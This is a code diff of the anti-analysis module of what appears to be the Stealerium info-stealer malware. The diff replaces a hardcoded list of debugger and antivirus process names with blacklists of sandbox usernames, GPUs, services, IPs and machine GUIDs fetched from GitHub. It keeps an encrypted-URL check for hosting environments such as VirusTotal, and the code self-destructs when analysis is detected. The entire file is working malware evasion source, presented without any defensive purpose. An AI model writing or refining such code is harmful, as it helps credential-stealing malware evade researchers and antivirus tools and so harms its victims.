@@ -1,51 +1,333 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
 using System.Management;
 using System.Net.Http;
 using System.Runtime.InteropServices;
-using System.Threading;
+using System.ServiceProcess;
+using System.Text;
 using System.Threading.Tasks;
+using Microsoft.Win32;
 using Stealerium.Stub.Helpers;
 
 namespace Stealerium.Stub.Modules.Implant
 {
     internal sealed class AntiAnalysis
     {
-        // CheckRemoteDebuggerPresent (Detect debugger)
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
-
-        // GetModuleHandle (Detect SandBox)
         [DllImport("kernel32.dll")]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
-        /// <summary>
-        /// Detects if the file is being debugged.
-        /// </summary>
-        public static bool Debugger()
+        // Base URL for fetching blacklist files
+        private const string BaseUrl = "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/";
+
+        // URLs to the raw text files in the virustotal-vm-blacklist repository
+        private static readonly Dictionary<string, string> ListUrls = new Dictionary<string, string>
         {
-            var isDebuggerPresent = false;
+            { "PCUsernames", BaseUrl + "pc_username_list.txt" },
+            { "PCNames", BaseUrl + "pc_name_list.txt" },
+            { "GPUs", BaseUrl + "gpu_list.txt" },
+            { "Processes", BaseUrl + "processes_list.txt" },
+            { "Services", BaseUrl + "services_list.txt" },
+            { "IPs", BaseUrl + "ip_list.txt" },
+            { "MachineGuids", BaseUrl + "MachineGuid.txt" }
+        };
+
+        // Static fields to cache the loaded lists as HashSet for O(1) lookups
+        private static readonly Dictionary<string, HashSet<string>> Blacklists = new Dictionary<string, HashSet<string>>
+        {
+            { "PCUsernames", null },
+            { "PCNames", null },
+            { "GPUs", null },
+            { "Processes", null },
+            { "Services", null },
+            { "IPs", null },
+            { "MachineGuids", null }
+        };
+
+        private static readonly HttpClient HttpClient = new HttpClient
+        {
+            Timeout = TimeSpan.FromSeconds(10) // Set a reasonable timeout
+        };
+
+        /// <summary>
+        /// Loads a HashSet of strings from a given URL. Each line in the text file represents an item.
+        /// </summary>
+        /// <param name="key">The key representing the list.</param>
+        /// <returns>A Task representing the asynchronous operation.</returns>
+        private static async Task LoadListAsync(string key)
+        {
+            if (!ListUrls.ContainsKey(key))
+            {
+                Logging.Log($"AntiAnalysis: No URL defined for key '{key}'.");
+                return;
+            }
+
+            if (Blacklists[key] != null)
+                return; // Already loaded
+
             try
             {
-                CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
-                return isDebuggerPresent;
+                var response = await HttpClient.GetAsync(ListUrls[key]).ConfigureAwait(false);
+                response.EnsureSuccessStatusCode();
+                var content = await response.Content.ReadAsStringAsync().ConfigureAwait(false);
+
+                var hashSet = new HashSet<string>(
+                    content
+                        .Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)
+                        .Select(line => line.Trim().ToLowerInvariant()),
+                    StringComparer.OrdinalIgnoreCase // Ensures case-insensitive lookups
+                );
+
+                Blacklists[key] = hashSet;
+                Logging.Log($"AntiAnalysis: Successfully loaded '{key}' list with {hashSet.Count} entries.");
             }
-            catch
+            catch (Exception ex)
             {
-                return false;
+                Logging.Log($"AntiAnalysis: Failed to load '{key}' list from {ListUrls[key]}. Exception: {ex.Message}");
+                Blacklists[key] = new HashSet<string>(); // Initialize as empty to prevent null checks
             }
+        }
+
+        /// <summary>
+        /// Ensures that all blacklists are loaded concurrently.
+        /// </summary>
+        /// <returns>A Task representing the asynchronous operation.</returns>
+        private static async Task EnsureAllListsLoadedAsync()
+        {
+            var loadTasks = ListUrls.Keys.Select(key => LoadListAsync(key));
+            await Task.WhenAll(loadTasks).ConfigureAwait(false);
+        }
+
+        /// <summary>
+        /// Detects if the current PC username is listed in the suspicious PC usernames list.
+        /// </summary>
+        /// <returns>
+        /// Returns <c>true</c> if the current PC username matches any from the loaded list of suspicious PC usernames, 
+        /// otherwise returns <c>false</c>.
+        /// </returns>
+        public static bool SuspiciousPCUsername()
+        {
+            if (Blacklists["PCUsernames"] == null || !Blacklists["PCUsernames"].Any())
+                return false;
+
+            // Get the PC username
+            string pcUsername = Environment.UserName.ToLowerInvariant();
+
+            // Check if the PC username is in the suspicious list
+            return Blacklists["PCUsernames"].Contains(pcUsername);
+        }
+
+        /// <summary>
+        /// Detects if the current PC name is listed in the suspicious PC names list.
+        /// </summary>
+        /// <returns>
+        /// Returns <c>true</c> if the current PC name matches any from the loaded list of suspicious PC names, 
+        /// otherwise returns <c>false</c>.
+        /// </returns>
+        public static bool SuspiciousPCName()
+        {
+            if (Blacklists["PCNames"] == null || !Blacklists["PCNames"].Any())
+                return false;
+
+            // Get the PC name
+            string pcName = Environment.MachineName.ToLowerInvariant();
+
+            // Check if the PC name is in the suspicious list
+            return Blacklists["PCNames"].Contains(pcName);
+        }
+
+        /// <summary>
+        /// Detects if the system's GPU model is listed in the suspicious GPU list.
+        /// </summary>
+        /// <returns>
+        /// Returns <c>true</c> if any GPU model matches the suspicious list, otherwise returns <c>false</c>.
+        /// </returns>
+        public static bool SuspiciousGPU()
+        {
+            if (Blacklists["GPUs"] == null || !Blacklists["GPUs"].Any())
+                return false;
+
+            try
+            {
+                using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController"))
+                {
+                    foreach (var obj in searcher.Get())
+                    {
+                        var gpuName = obj["Name"]?.ToString().ToLowerInvariant() ?? string.Empty;
+                        foreach (var suspGpu in Blacklists["GPUs"])
+                        {
+                            if (gpuName.Contains(suspGpu))
+                            {
+                                Logging.Log($"AntiAnalysis: Suspicious GPU detected: {obj["Name"]}");
+                                return true;
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Logging.Log($"AntiAnalysis: Failed to check GPUs. Exception: {ex.Message}");
+            }
+
+            return false;
+        }
+
+        /// <summary>
+        /// Detects if any running process is listed in the suspicious processes list.
+        /// </summary>
+        /// <returns>
+        /// Returns <c>true</c> if any suspicious process is detected, otherwise returns <c>false</c>.
+        /// </returns>
+        public static bool SuspiciousProcess()
+        {
+            if (Blacklists["Processes"] == null || !Blacklists["Processes"].Any())
+                return false;
+
+            var runningProcesses = Process.GetProcesses();
+
+            foreach (var process in runningProcesses)
+            {
+                try
+                {
+                    string processName = process.ProcessName.ToLowerInvariant();
+                    if (Blacklists["Processes"].Contains(processName))
+                    {
+                        Logging.Log($"AntiAnalysis: Suspicious process detected: {process.ProcessName}");
+                        return true;
+                    }
+                }
+                catch (Exception ex) when (ex is InvalidOperationException || ex is System.ComponentModel.Win32Exception)
+                {
+                    Logging.Log($"AntiAnalysis: Failed to access process information: {ex.Message}");
+                }
+            }
+
+            return false;
+        }
+
+        /// <summary>
+        /// Detects if any running service is listed in the suspicious services list.
+        /// </summary>
+        /// <returns>
+        /// Returns <c>true</c> if any suspicious running service is detected, otherwise <c>false</c>.
+        /// </returns>
+        public static bool SuspiciousService()
+        {
+            if (Blacklists["Services"] == null || !Blacklists["Services"].Any())
+                return false;
+
+            try
+            {
+                var services = ServiceController.GetServices();
+                foreach (var service in services)
+                {
+                    // Check if the service is currently running
+                    if (service.Status == ServiceControllerStatus.Running)
+                    {
+                        string serviceName = service.ServiceName.ToLowerInvariant();
+                        if (Blacklists["Services"].Contains(serviceName))
+                        {
+                            Logging.Log($"AntiAnalysis: Suspicious running service detected: {service.ServiceName}");
+                            return true;
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Logging.Log($"AntiAnalysis: Failed to check services. Exception: {ex.Message}");
+            }
+
+            return false;
+        }
+
+        /// <summary>
+        /// Detects if the system's IP address is listed in the suspicious IPs list.
+        /// </summary>
+        /// <returns>
+        /// Returns <c>true</c> if any IP address matches the suspicious list, otherwise returns <c>false</c>.
+        /// </returns>
+        public static bool SuspiciousIP()
+        {
+            if (Blacklists["IPs"] == null || !Blacklists["IPs"].Any())
+                return false;
+
+            try
+            {
+                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
+                foreach (var ip in host.AddressList)
+                {
+                    string ipAddress = ip.ToString();
+                    if (Blacklists["IPs"].Contains(ipAddress))
+                    {
+                        Logging.Log($"AntiAnalysis: Suspicious IP detected: {ipAddress}");
+                        return true;
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Logging.Log($"AntiAnalysis: Failed to check IP addresses. Exception: {ex.Message}");
+            }
+
+            return false;
+        }
+
+        /// <summary>
+        /// Detects if the system's Machine GUID is listed in the suspicious Machine GUIDs list.
+        /// </summary>
+        /// <returns>
+        /// Returns <c>true</c> if the Machine GUID matches any from the suspicious list, otherwise returns <c>false</c>.
+        /// </returns>
+        public static bool SuspiciousMachineGuid()
+        {
+            if (Blacklists["MachineGuids"] == null || !Blacklists["MachineGuids"].Any())
+                return false;
+
+            try
+            {
+                using (RegistryKey localMachine = Registry.LocalMachine)
+                {
+                    using (RegistryKey key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
+                    {
+                        if (key != null)
+                        {
+                            object guid = key.GetValue("MachineGuid");
+                            if (guid != null)
+                            {
+                                string machineGuid = guid.ToString().ToLowerInvariant();
+                                if (Blacklists["MachineGuids"].Contains(machineGuid))
+                                {
+                                    Logging.Log($"AntiAnalysis: Suspicious Machine GUID detected: {machineGuid}");
+                                    return true;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Logging.Log($"AntiAnalysis: Failed to retrieve Machine GUID. Exception: {ex.Message}");
+            }
+
+            return false;
         }
 
         /// <summary>
         /// Detects if the file is running in an emulator.
         /// </summary>
+        /// <returns>
+        /// Returns <c>true</c> if running in an emulator, otherwise <c>false</c>.
+        /// </returns>
         public static bool Emulator()
         {
             try
             {
                 var ticks = DateTime.Now.Ticks;
-                Thread.Sleep(10);
+                Task.Delay(10).Wait(); // Using Task.Delay for non-blocking wait
                 if (DateTime.Now.Ticks - ticks < 10L)
                     return true;
             }
@@ -60,21 +342,23 @@ namespace Stealerium.Stub.Modules.Implant
         /// <summary>
         /// Detects if the system is hosted in environments like VirusTotal or AnyRun.
         /// </summary>
+        /// <returns>
+        /// Returns <c>true</c> if hosting is detected, otherwise <c>false</c>.
+        /// </returns>
         public static async Task<bool> HostingAsync()
         {
             try
             {
-                using (var client = new HttpClient())
+                var decryptedUrl = StringsCrypt.Decrypt(new byte[]
                 {
-                    var status = await client.GetStringAsync(StringsCrypt.Decrypt(new byte[]
-                    {
-                        145, 244, 154, 250, 238, 89, 238, 36, 197, 152,
-                        49, 235, 197, 102, 94, 163, 45, 250, 10,
-                        108, 175, 221, 139, 165, 121, 24
-                    })).ConfigureAwait(false);
+                    145, 244, 154, 250, 238, 89, 238, 36, 197, 152,
+                    49, 235, 197, 102, 94, 163, 45, 250, 10,
+                    108, 175, 221, 139, 165, 121, 24
+                });
 
-                    return status.Contains("true");
-                }
+                var status = await HttpClient.GetStringAsync(decryptedUrl).ConfigureAwait(false);
+                // Replaced Contains with IndexOf to fix CS1501 error
+                return status.IndexOf("true", StringComparison.OrdinalIgnoreCase) >= 0;
             }
             catch
             {
@@ -83,48 +367,11 @@ namespace Stealerium.Stub.Modules.Implant
         }
 
         /// <summary>
-        /// Detects suspicious processes that are commonly used for analysis.
-        /// </summary>
-        public static bool Processes()
-        {
-            var runningProcessList = Process.GetProcesses();
-
-            // List of common tools and processes used for reverse engineering, system analysis, and debugging
-            string[] suspiciousProcesses =
-            {
-                // Debugging and reverse engineering tools
-                "processhacker", "netstat", "netmon", "tcpview", "wireshark", "filemon", "regmon", "cain",
-                "ollydbg", "ida", "ida64", "idag", "idag64", "idaw", "idaw64", "idau", "idau64", "scylla",
-                "scylla_x64", "scylla_x86", "procdump", "procmon", "x64dbg", "x32dbg", "windbg", "reshacker",
-        
-                // Virtual machine processes
-                "vmware", "vboxservice", "vboxtray", "vmsrvc", "vmusrvc",
-        
-                // Sandboxing tools
-                "sandboxie", "sandboxiedcomlaunch", "sandboxiedcomdll", "snxhk", "avast", "cuckoo",
-        
-                // Antivirus and security software often used in analysis
-                "avg", "avast", "avp", "kav", "sophos", "malwarebytes", "mbam", "emsisoft", "bitdefender",
-                "eset", "nod32", "mcshield", "clamwin", "clamav", "f-secure", "gdata", "zonealarm", 
-        
-                // Monitoring and system inspection tools
-                "autoruns", "autorunsc", "procexp", "procexp64", "perfmon", "sysmon", "sysinternals",
-        
-                // Network monitoring and inspection tools
-                "fiddler", "charles", "burpsuite", "mitmproxy", "netmon", "ethereal", "tshark",
-        
-                // Miscellaneous tools
-                "cheatengine", "de4dot", "xperf", "hxd", "dumpcap", "wireshark", "immunitydebugger", "resourcehacker"
-            };
-
-            // Check if any running process matches the suspicious processes list
-            return runningProcessList.Any(process => suspiciousProcesses.Contains(process.ProcessName.ToLower()));
-        }
-
-
-        /// <summary>
         /// Detects if the system is running in a sandbox.
         /// </summary>
+        /// <returns>
+        /// Returns <c>true</c> if running in a sandbox, otherwise <c>false</c>.
+        /// </returns>
         public static bool SandBox()
         {
             string[] sandboxDlls = { "SbieDll", "SxIn", "Sf2", "snxhk", "cmdvrt32" };
@@ -134,6 +381,9 @@ namespace Stealerium.Stub.Modules.Implant
         /// <summary>
         /// Detects if the system is running inside a Virtual Machine.
         /// </summary>
+        /// <returns>
+        /// Returns <c>true</c> if running inside a Virtual Machine, otherwise <c>false</c>.
+        /// </returns>
         public static bool VirtualBox()
         {
             try
@@ -144,21 +394,24 @@ namespace Stealerium.Stub.Modules.Implant
                     {
                         foreach (var obj in managementObjectCollection)
                         {
-                            var manufacturer = obj["Manufacturer"].ToString().ToLower();
-                            var model = obj["Model"].ToString().ToUpperInvariant();
+                            var manufacturer = obj["Manufacturer"]?.ToString().ToLower() ?? string.Empty;
+                            var model = obj["Model"]?.ToString().ToLower() ?? string.Empty;
 
-                            if ((manufacturer == "microsoft corporation" && model.Contains("VIRTUAL")) ||
-                                manufacturer.Contains("vmware") || model == "VIRTUALBOX")
+                            if ((manufacturer.Contains("microsoft") && model.Contains("virtual")) ||
+                                manufacturer.Contains("vmware") || model.Contains("virtualbox"))
                                 return true;
                         }
                     }
                 }
 
-                foreach (var obj in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
+                using (var searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController"))
                 {
-                    var name = obj.GetPropertyValue("Name").ToString();
-                    if (name.Contains("VMware") || name.Contains("VBox"))
-                        return true;
+                    foreach (var obj in searcher.Get())
+                    {
+                        var name = obj.GetPropertyValue("Name")?.ToString().ToLower() ?? string.Empty;
+                        if (name.Contains("vmware") || name.Contains("vbox"))
+                            return true;
+                    }
                 }
             }
             catch
@@ -172,46 +425,116 @@ namespace Stealerium.Stub.Modules.Implant
         /// <summary>
         /// Runs all anti-analysis checks and self-destructs if any hostile environment is detected.
         /// </summary>
-        public static async Task<bool> RunAsync()
+        /// <returns>
+        /// Returns <c>true</c> if any anti-analysis check detects a hostile environment, 
+        /// otherwise returns <c>false</c>.
+        /// </returns>
+        public static bool Run()
         {
-            if (Config.AntiAnalysis != "1") return false;
-
-            if (await HostingAsync().ConfigureAwait(false))
+            try
             {
-                Logging.Log("AntiAnalysis: Hosting detected! Self-destructing...");
-                SelfDestruct.Melt();
-                return true;
-            }
+                // Load all blacklists concurrently
+                var loadTask = EnsureAllListsLoadedAsync();
+                loadTask.Wait(); // Wait synchronously
 
-            if (Processes())
+                // Hosting check
+                var hostingTask = HostingAsync();
+                hostingTask.Wait();
+                bool hostingDetected = hostingTask.Result;
+                if (hostingDetected)
+                {
+                    Logging.Log("AntiAnalysis: Hosting detected! Self-destructing...");
+                    SelfDestruct.Melt();
+                    return true;
+                }
+
+                // Suspicious GPU check
+                if (SuspiciousGPU())
+                {
+                    Logging.Log("AntiAnalysis: Suspicious GPU detected! Self-destructing...");
+                    SelfDestruct.Melt();
+                    return true;
+                }
+
+                // Suspicious processes check
+                if (SuspiciousProcess())
+                {
+                    Logging.Log("AntiAnalysis: Suspicious process detected! Self-destructing...");
+                    SelfDestruct.Melt();
+                    return true;
+                }
+
+                // Suspicious services check
+                if (SuspiciousService())
+                {
+                    Logging.Log("AntiAnalysis: Suspicious service detected! Self-destructing...");
+                    SelfDestruct.Melt();
+                    return true;
+                }
+
+                // Virtual Machine check
+                if (VirtualBox())
+                {
+                    Logging.Log("AntiAnalysis: Virtual Machine detected! Self-destructing...");
+                    SelfDestruct.Melt();
+                    return true;
+                }
+
+                // Sandbox check
+                if (SandBox())
+                {
+                    Logging.Log("AntiAnalysis: Sandbox detected! Self-destructing...");
+                    SelfDestruct.Melt();
+                    return true;
+                }
+
+                // Emulator check
+                if (Emulator())
+                {
+                    Logging.Log("AntiAnalysis: Emulator detected! Self-destructing...");
+                    SelfDestruct.Melt();
+                    return true;
+                }
+
+                // Suspicious IP check
+                if (SuspiciousIP())
+                {
+                    Logging.Log("AntiAnalysis: Suspicious IP detected! Self-destructing...");
+                    SelfDestruct.Melt();
+                    return true;
+                }
+
+                // Suspicious PC name check
+                if (SuspiciousPCName())
+                {
+                    Logging.Log("AntiAnalysis: Suspicious PC name detected! Self-destructing...");
+                    SelfDestruct.Melt();
+                    return true;
+                }
+
+                // Suspicious PC username check
+                if (SuspiciousPCUsername())
+                {
+                    Logging.Log("AntiAnalysis: Suspicious PC username detected! Self-destructing...");
+                    SelfDestruct.Melt();
+                    return true;
+                }
+
+                // Suspicious Machine GUID check
+                if (SuspiciousMachineGuid())
+                {
+                    Logging.Log("AntiAnalysis: Suspicious Machine GUID detected! Self-destructing...");
+                    SelfDestruct.Melt();
+                    return true;
+                }
+
+                return false;
+            }
+            catch (Exception ex)
             {
-                Logging.Log("AntiAnalysis: Suspicious process detected! Self-destructing...");
-                SelfDestruct.Melt();
-                return true;
+                Logging.Log($"AntiAnalysis: An error occurred during anti-analysis checks. Exception: {ex.Message}");
+                return false;
             }
-
-            if (VirtualBox())
-            {
-                Logging.Log("AntiAnalysis: Virtual Machine detected! Self-destructing...");
-                SelfDestruct.Melt();
-                return true;
-            }
-
-            if (SandBox())
-            {
-                Logging.Log("AntiAnalysis: Sandbox detected! Self-destructing...");
-                SelfDestruct.Melt();
-                return true;
-            }
-
-            if (Debugger())
-            {
-                Logging.Log("AntiAnalysis: Debugger detected! Self-destructing...");
-                SelfDestruct.Melt();
-                return true;
-            }
-
-            return false;
         }
     }
 }
